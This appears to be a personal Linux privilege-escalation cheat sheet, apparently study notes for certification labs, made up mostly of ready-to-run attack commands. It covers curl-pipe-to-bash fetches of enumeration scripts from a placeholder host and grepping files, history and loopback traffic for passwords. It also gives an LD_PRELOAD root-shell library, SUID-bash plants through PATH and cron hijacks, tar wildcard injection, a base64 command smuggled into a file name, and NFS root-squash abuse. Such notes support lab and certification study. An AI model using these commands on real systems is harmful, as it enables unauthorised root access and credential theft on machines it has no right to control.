## Automated enumeration

[Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1):
```bash
wget http://<IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a

-- OR --

curl http://<IP>linpeas.sh|bash
```
>[!warning]
> `-a` flag adds some additional scanning

[LinEnum](https://github.com/rebootuser/LinEnum):
```bash
wget http://<IP>/linenum.sh
chmod +x linenum.sh
./linenum.sh

-- OR --

curl http://<IP>/linenum.sh|bash
```


### Basic info

```bash
id
cat /etc/passwd
hostname
ip a
routel
cat /etc/iptables/rules.v4

sudo tcpdump -i lo -A | grep "pass"
```


### Filesystem enum

Check for config files, DB files and grep for password in directories:
```bash
grep -R "pass"
```
>[!info]
>Case insensitive grep using -i flag

Find writable directories:
```bash
find / -writable -type d 2>/dev/null
```

Find group owned files:
```bash
find / -group <group> 2>/dev/null
```

Find password files:
```bash
find / -type f -name "*pass*" 2>/dev/null
```

List mounted drives:
```bash
cat /etc/fstab
mount
lsblk
```


### Vulnerable software version

List installed packages:
```bash
dpkg -l
```

Check if the version of a particular software is vulnerable to a CVE:
```bash
# example:
exiftool -ver
```


### SU stuff

Try su `<username>:<username>`
>[!warning] 
>- ex: `patrick:patrick`, `root:root` (./linpeas.sh -a should check this)
>- Try found creds on every user **even root**


### Environment variables

Look for passwords in environment variables:
```bash
env
printenv
cat -/.bashrc
```


### You've got mail

Check for interesting mails:
```bash
cd /var/spool/mail
```


### Files in home user's directory

```bash
cat .bash_history
cat .bash_history | grep pass
cat .bashrc
```


### Kernel Exploits

Enumeration commands:
```bash
cat /etc/issue
cat /etc/os-release
cat /proc/version
lsmod # kernel modules & drivers
/sbin/modinfo <module> # Get more info about a module
uname -a
uname -r
arch
```

Locating exploit:
```bash
searchsploit <kernel version>
```
>[!info] 
>- google.com
>- exploit-db

Fixing `gcc: error trying to exec 'cc1': execvp: No such file or directory`
```bash
# Locate cc1
find / -name cc1 2>/dev/null
/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1

# Add to PATH
export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/4.6/cc1
```


### Sudo

Check sudo version:
- sudo --version
- https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

Enumeration:
```bash
sudo -l
```
--> [gtfobins](https://gtfobins.github.io/)

LD_PRELOAD set:
```bash
env_keep+=LD_PRELOAD

# C code:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Compile
gcc -fPIC -shared -o /tmp/x.so c.c -nostartfiles

# Become root
sudo LD_PRELOAD=/tmp/x.so apache2
```

Python abuse:
- Modify original file
- Create library file that is being imported
- [[Walla]]

Check what the binary that is being ran does, if it allows you to overwrite existing files:
- Overwrite /etc/passwd
- Overwrite root's authorized keys file
- [[Flow]] && [[RussianDolls]]


### SUID binaries

Enumeration:
- [gtfobins](https://gtfobins.github.io/)
```bash
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
```

Invoked binary calls program without specifying the full path:
```bash
# Modify PATH variable
export PATH=/tmp:$PATH

# Create malicious payload
echo "chmod u+s /bin/bash" > /tmp/<binary-name>

# Run the program
./<binary-name>
```


### Capabilities

Enumeration:
- [gtfobins](https://gtfobins.github.io/)
```bash
getcap -r / 2>/dev/null
```


### Running processes and services

Enumeration:
```bash
ps aux
ps aux | grep root
ps -ef

netstat -ano
netstat -tulpn

./pspy -i 5
```
>[!info]
>Running as root? Vulnerable version? Port forward?

Check the services file for possible credentials:
```bash
cd /etc/systemd/system/
grep -r pass
grep -r secret
```
>[!info]
>Interesting services may contain sensitive data
- [[Air]]



### Cron jobs

Enumeration:
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
grep "CRON" /var/log/syslog
```

Run pspy 
- https://github.com/DominicBreuker/pspy
```bash
./pspy 

# Lower the interval to reveal passwords
./pspy -i 5
```
>[!info]
>Example writeup: [[Mantis]]

**Writable path:**
- Any non full PATH binary can be exploited (e.g. run-parts)
```bash
./pspy -i 5
echo "chmod u+s /bin/bash" > <PATH>/<filename>
```
E.g. [[Roquefort]]

Relative path:
```bash
# cat /etc/crontab
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

--- SNIP ---

* * * * * root overwrite.sh

# Since the path variable starts with /home/user and we have control over this directory we can create the overwrite.sh file in that directory
echo "chmod u+s /bin/bash" > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

Tar wildcards: 
```bash
# Example:
tar czf /tmp/backup.tar.gz *

# Exploitation
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
chmod +x /home/user/runme.sh

# Become root
/tmp/bash -p
```

Verify what the cronjob does:
- writable file? --> overwrite original file
- What version of a program is being ran? eg. [[Exfiltrated]]

Abuse curly brackets in find -exec command:
```bash
# Cron job file
find /dev/shm -type f -exec sh -c 'rm {}' \;

# Payload
echo "chmod u+s /bin/bash" |base64
Y2htb2QgdStzIC9iaW4vYmFzaAo=
echo "" > '$(echo "Y2htb2QgdStzIC9iaW4vYmFzaAo=" |base64 -d|bash)'
```
- https://medium.com/@ardian.danny/oscp-practice-series-10-proving-grounds-assignment-bffe4418b168
- [[Assignment]]


### PATH variable

If we have write permissions on a folder in the PATH variable we can look for root jobs that are running without the full specified path:
- [[Roquefort]]


### NFS Root Squashing

```bash
# Discover mount
cat /etc/exports

# Mount share (on kali)
sudo apt install nfs-common
mkdir /tmp/trial
mount -t nfs -o rw,vers=3 <IP>:/tmp/ /tmp/trial

# Copy /bin/bash to share (on target)
cp /bin/bash .

# Make root owned and add sticky bit (on kali)
chown root bash
chmod +s bash

# Become root
./bash -p
```
